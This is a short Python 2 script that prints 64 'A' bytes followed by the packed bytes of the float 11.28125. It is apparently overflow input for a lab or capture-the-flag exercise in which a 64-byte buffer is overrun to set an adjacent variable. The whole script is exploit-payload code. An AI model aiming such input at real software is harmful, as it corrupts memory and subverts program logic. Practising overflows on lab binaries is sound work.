import struct

# Convert a float to its 4 byte representation
def pack(f):
    return "".join([c for c in struct.pack('f', f)])

d = 11.28125
b = pack(d)
print "A" * 64 + b
